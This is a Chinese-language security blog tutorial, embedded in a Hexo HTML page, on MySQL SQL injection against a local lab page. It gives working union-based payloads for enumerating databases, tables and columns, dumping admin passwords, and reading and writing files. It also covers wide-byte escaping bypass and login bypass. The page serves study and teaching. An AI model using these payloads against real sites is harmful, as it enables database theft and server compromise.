@@ -1,0 +1,1102 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="Web安全,SQL注入,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Mysql注入相关01-一般注入 Access数据库结构 1234Access数据库	表名		列名			数据">
+<meta name="keywords" content="Web安全,SQL注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mysql注入相关">
+<meta property="og:url" content="http://21guns.top/2018/01/22/Mysql注入相关/index.html">
+<meta property="og:site_name" content="Ry1ynn&#39;s blogs">
+<meta property="og:description" content="Mysql注入相关01-一般注入 Access数据库结构 1234Access数据库	表名		列名			数据">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-19/45925248.jpg">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-19/78208784.jpg">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-19/69811165.jpg">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-20/18211067.jpg">
+<meta property="og:updated_time" content="2019-02-18T07:39:43.143Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Mysql注入相关">
+<meta name="twitter:description" content="Mysql注入相关01-一般注入 Access数据库结构 1234Access数据库	表名		列名			数据">
+<meta name="twitter:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-19/45925248.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://21guns.top/2018/01/22/Mysql注入相关/">
+
+
+
+
+
+  <title>Mysql注入相关 | Ry1ynn's blogs</title>
+  
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ry1ynn's blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2018/01/22/Mysql注入相关/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ry1ynn">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ry1ynn's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Mysql注入相关</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-22T15:05:39+08:00">
+                2018-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全基础/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全基础</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Mysql注入相关"><a href="#Mysql注入相关" class="headerlink" title="Mysql注入相关"></a>Mysql注入相关</h1><h2 id="01-一般注入"><a href="#01-一般注入" class="headerlink" title="01-一般注入"></a>01-一般注入</h2><ul>
+<li><p>Access数据库结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access数据库</span><br><span class="line">	表名</span><br><span class="line">		列名</span><br><span class="line">			数据</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<a id="more"></a>
+<ul>
+<li><p>Mysql数据库结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">数据库A</span><br><span class="line">	表名</span><br><span class="line">		列名</span><br><span class="line">			数据</span><br><span class="line">			</span><br><span class="line">数据库B</span><br><span class="line">	表名</span><br><span class="line">		列名</span><br><span class="line">			数据</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Php+mysql注入（5.0以上）</p>
+<ul>
+<li>步骤：<ol>
+<li>判断注入</li>
+<li>猜解字段数</li>
+<li>猜数据库名</li>
+<li>猜表名</li>
+<li>猜列名</li>
+<li>猜数据</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>相关语句</p>
+<ul>
+<li><p>注入语句</p>
+<p><code>http://127.0.0.1/wl13/sql.php?x=1 union select 1,2,3</code></p>
+</li>
+<li><p>查询信息</p>
+<p><code>http://127.0.0.1/wl13/sql.php?x=1%20union%20select%20database(),version(),user()</code></p>
+</li>
+<li><p>查询sqlin（hex编码）下的表名信息</p>
+<p><code>http://127.0.0.1/wl13/sql.php?x=1 union select table_name,2,3 from information_schema.tables where table_schema=0x73716C696E20</code></p>
+</li>
+<li><p>选取指定表名key，获取列名信息</p>
+<p><code>http://127.0.0.1/wl13/sql.php?x=1 union select column_name,2,3 from information_schema.columns where table_name=0x6B6579</code></p>
+</li>
+<li><p>直接获取key表名下的data列名的数据</p>
+<p><code>http://127.0.0.1/wl13/sql.php?x=1%20union%20select%20data,2,3%20from%20sqlin.key</code></p>
+</li>
+</ul>
+</li>
+<li><p>Php+mysql注入点 这样写猜表名是否正确，给出理由？</p>
+<ul>
+<li><a href="http://127.0.0.1/wl13/sql.php?x=1" target="_blank" rel="noopener">http://127.0.0.1/wl13/sql.php?x=1</a> union select 1,2,3 from admin</li>
+<li>这样猜解表名就是暴力猜解</li>
+</ul>
+</li>
+<li><p>注入函数</p>
+<ul>
+<li>数据库名 database()</li>
+<li>数据库版本 version()</li>
+<li>数据库用户 user()</li>
+<li>操作系统 @@version_compile_os</li>
+</ul>
+</li>
+<li><p>Mysql5.0 注入（有根据）</p>
+<ul>
+<li>数据库中“.”代表下一级</li>
+</ul>
+</li>
+</ul>
+<pre><code>- Information_schema：
+  - mysql5.0及以上版本自带数据库
+  - 存储有mysql所有数据库下的表名及列名信息
+- Information_schema.tables：存储所有表名信息的表
+- Table_name：表名
+- table_schema：数据库名
+- Column_name：列名
+- information_schema.columns：存储所有列名信息的表
+</code></pre><ul>
+<li><p>问题：</p>
+<ul>
+<li><p>注入产生的地方在那里？<br>答：接受参数值未进行过滤</p>
+</li>
+<li><p>如何修复此类注入</p>
+<ul>
+<li><p>根据参数值的规律过滤（数字，过滤非数字）</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-19/45925248.jpg" alt></p>
+</li>
+<li><p>指定关键字过滤（select union等关键字）</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-19/78208784.jpg" alt></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="02-注入进阶"><a href="#02-注入进阶" class="headerlink" title="02-注入进阶"></a>02-注入进阶</h2><h3 id="2-1-权限入侵"><a href="#2-1-权限入侵" class="headerlink" title="2.1-权限入侵"></a>2.1-权限入侵</h3><ul>
+<li><p>不同数据库用户对应的权限不同：</p>
+<ul>
+<li>Root用户：管理所有数据库，文件读取，文件写入</li>
+<li>普通用户：管理其对应的数据库，不可文件读取和写入</li>
+</ul>
+</li>
+<li><p>注入点用户</p>
+<ul>
+<li><p>注入点的用户权限：网站自身连接数据库时，脚本连接用户 == 注入点的用户</p>
+</li>
+<li><p>采用user()获取当前注入点的用户名</p>
+</li>
+<li><p>图示：</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-19/69811165.jpg" alt></p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-2-文件读取及写入"><a href="#2-2-文件读取及写入" class="headerlink" title="2.2-文件读取及写入"></a>2.2-文件读取及写入</h3><ul>
+<li><p>文件读取及写入</p>
+<ul>
+<li><p>读取</p>
+<p><code>http://127.0.0.1/wl13/sql.php?x=1%20union%20seleCT%20load_file(%27d:/test.txt%27),2,3</code></p>
+</li>
+<li><p>写入</p>
+<p><code>http://127.0.0.1/wl13/sql.php?x=1 union selecT &#39;aaaa&#39;,2,3 into outfile &#39;d:/test2.txt&#39;</code></p>
+</li>
+</ul>
+</li>
+<li><p>网站绝对路径获取方法</p>
+<ul>
+<li>报错显示</li>
+<li>漏洞爆错（如百度，phpcms 爆路径）</li>
+<li>遗留文件<ul>
+<li>信息泄露</li>
+<li>Phpinfo.php info.php php.php test.php</li>
+<li>最常见利用phpinfo()函数</li>
+</ul>
+</li>
+<li>读取网站配置文件</li>
+<li>社工（搜索引擎）</li>
+</ul>
+</li>
+<li><p>路径相关问题</p>
+<ul>
+<li>盘符符号问题：不使用“\”，使用“/”或“\”</li>
+<li>符号，编码问题：编码即不使用单引号，单引号即不使用编码</li>
+</ul>
+</li>
+</ul>
+<h2 id="03-其它注入姿势"><a href="#03-其它注入姿势" class="headerlink" title="03-其它注入姿势"></a>03-其它注入姿势</h2><ul>
+<li>巧用mysql sql语句中的注释符<ul>
+<li><code>--</code></li>
+<li><code>#</code></li>
+<li><code>/**/</code></li>
+<li>其它</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>跨库注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">网站A 数据库A</span><br><span class="line">网站B 数据库B</span><br><span class="line"></span><br><span class="line">Mysql</span><br><span class="line">数据库A</span><br><span class="line">数据库B</span><br><span class="line"></span><br><span class="line">目的：渗透网站B，获取数据库B</span><br><span class="line">网站B未检测到漏洞，无法进行渗透</span><br><span class="line">思路：通过A网站注入点，跨库注入B数据库，从而对网站B进行渗透</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>独立服务器与VPS服务器</p>
+<ul>
+<li>独立服务器：<ul>
+<li>所有数据库</li>
+</ul>
+</li>
+<li>Vps服务器<ul>
+<li>部分数据库</li>
+<li>Vps1用户=vps1 web</li>
+<li>Vps2用户=vps2 web</li>
+<li>Vps3用户==vps3 web</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>注入工具抓包分析</p>
+<ul>
+<li><p>抓包</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/wl13/sql.php?x=999999.9+union+all+select+%28select+distinct+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28schema_name+as+char%29%29%29%2C0x27%2C0x7e%29+from+%60information_schema%60.schemata+limit+14%2C1%29%2C0x31303235343830303536%2C0x31303235343830303536--</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij</span><br><span class="line"><span class="attribute">Connection</span>: Close</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>获取所有数据库名的注入语句</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://127.0.0.1//wl13/sql.php?</span></span><br><span class="line">x=1 union all select (select distinct concat(0x7e,0x27,unhex(Hex(cast(schema_name as char))),0x27,0x7e) from `information_schema`.schemata limit </span><br><span class="line"><span class="attribute">13,1),0x31303235343830303536,0x31303235343830303536--</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取指定数据库名下的表名信息</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/wl13/sql.php?x=999999.9+union+all+select+%28select+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28group_concat%28table_name%29+as+char%29%29%29%2C0x27%2C0x7e%29+from+%60information_schema%60.tables+where+table_schema%3D0x6874747073716C696E%29%2C0x31303235343830303536%2C0x31303235343830303536-- HTTP/1.1</span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1///wl13/sql.php?x=1 union all select (select concat(0x7e,0x27,unhex(Hex(cast(group_concat(table_name) as char))),0x27,0x7e) from `information_schema`.tables where table_schema=0x6874747073716C696E),0x31303235343830303536,0x31303235343830303536--</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取指定表名下的列名信息</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1///wl13/sql.php?x=1 union all select (select concat(0x7e,0x27,unhex(Hex(cast(group_concat(column_name) as char))),0x27,0x7e) from `information_schema`.columns where table_name=0x61646D696E),0x31303235343830303536,0x31303235343830303536--</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取指定数据:</p>
+<p><code>http://127.0.0.1///wl13/sql.php?x=1 union select username,password,3 from httpsqlin.admin</code></p>
+</li>
+</ul>
+<ul>
+<li><p>查询意义</p>
+<ul>
+<li>Version()：information_schema是否存在</li>
+<li>User()：判断权限</li>
+<li>Database()：获取数据</li>
+<li>@@version_compile_os：<ul>
+<li>判断操作系统</li>
+<li>提示注入的大小写问题</li>
+<li>windows 大小写不敏感 linux 大小写敏感）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>注入工具使用</p>
+<ul>
+<li>sqlmap注入神器</li>
+<li>穿山甲，萝卜头等</li>
+</ul>
+</li>
+</ul>
+<h2 id="04-防注入及其绕过"><a href="#04-防注入及其绕过" class="headerlink" title="04-防注入及其绕过"></a>04-防注入及其绕过</h2><ul>
+<li><p>防注入措施之转义</p>
+<ul>
+<li>魔术引号开启：Php.ini文件中magic_quote_gpc=on 开启</li>
+<li>函数限制：addslashes 函数</li>
+</ul>
+</li>
+<li><p>作用：</p>
+<ul>
+<li>所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符</li>
+<li>自动加上一个反斜线进行转义。</li>
+</ul>
+</li>
+<li><p>绕过思路</p>
+<ul>
+<li><p>宽字节注入</p>
+<ul>
+<li><p>中文或乱码字符占两个字节，符号或英文数字占一个字节</p>
+</li>
+<li><p>\‘ = 两个字节</p>
+</li>
+<li><p>如%df</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-20/18211067.jpg" alt></p>
+</li>
+</ul>
+</li>
+<li><p>编码注入</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="05-简单分类"><a href="#05-简单分类" class="headerlink" title="05-简单分类"></a>05-简单分类</h2><ul>
+<li>根据参数（参数值类型注入方式）<ul>
+<li>数字：<ul>
+<li><code>www.xxxx.com/news.php?id=1</code></li>
+<li><code>Select * from news where id=1</code></li>
+</ul>
+</li>
+<li>字符：<ul>
+<li><code>www.xxxx.com/news.php?name=小迪</code></li>
+<li><code>Select * from news where name=’xiaodi’</code></li>
+</ul>
+</li>
+<li>搜索：<ul>
+<li><code>www.xxxx.com/news.php?search=小迪 搜索框</code></li>
+<li><code>Select * from news where name like ‘%xiaodi%’
+order by username</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>根据提交方式<ul>
+<li>GET注入</li>
+<li>POST注入<ul>
+<li>登陆框注入</li>
+<li>如，后台登录bypass</li>
+<li>利用万能密码，如<code>&#39; or 1=1</code></li>
+</ul>
+</li>
+<li>Cookie注入<ul>
+<li><code>$id=$_COOKIE[&#39;id&#39;]</code></li>
+<li>接受cookie提交方式下的参数名id的值并赋值给变量id</li>
+</ul>
+</li>
+<li>http请求头注入<ul>
+<li>利用php全局变量，$_SERVER</li>
+<li>如，<code>$id=$_SERVER[&#39;HTTP_USER_AGENT&#39;]</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+          
+            <a href="/tags/SQL注入/" rel="tag"># SQL注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/22/Access注入相关/" rel="next" title="Access注入相关">
+                <i class="fa fa-chevron-left"></i> Access注入相关
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/22/注入相关问题/" rel="prev" title="注入相关问题">
+                注入相关问题 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ry1ynn">
+            
+              <p class="site-author-name" itemprop="name">Ry1ynn</p>
+              <p class="site-description motion-element" itemprop="description">我们的征途是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">108</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Ry1ynn" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:ry1ynn_pri@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/u/5794121667" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="/images/weixin.JPG" target="_blank" title="Wechat">
+                      
+                        <i class="fa fa-fw fa-weixin"></i>Wechat</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.t00ls.net/" title="T00ls" target="_blank">T00ls</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.freebuf.com/" title="FreeBuf" target="_blank">FreeBuf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sec-wiki.com/" title="SecWiki" target="_blank">SecWiki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.seebug.org/" title="Seebug" target="_blank">Seebug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.91ri.org/" title="91Ri" target="_blank">91Ri</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.pediy.com/" title="看雪" target="_blank">看雪</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.52pojie.cn/" title="吾爱破解" target="_blank">吾爱破解</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.anquanke.com/" title="安全客" target="_blank">安全客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ichunqiu.com/" title="i春秋" target="_blank">i春秋</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Mysql注入相关"><span class="nav-text">Mysql注入相关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#01-一般注入"><span class="nav-text">01-一般注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#02-注入进阶"><span class="nav-text">02-注入进阶</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-权限入侵"><span class="nav-text">2.1-权限入侵</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-文件读取及写入"><span class="nav-text">2.2-文件读取及写入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#03-其它注入姿势"><span class="nav-text">03-其它注入姿势</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#04-防注入及其绕过"><span class="nav-text">04-防注入及其绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#05-简单分类"><span class="nav-text">05-简单分类</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ry1ynn</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script id="ribbon" type="text/javascript" size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
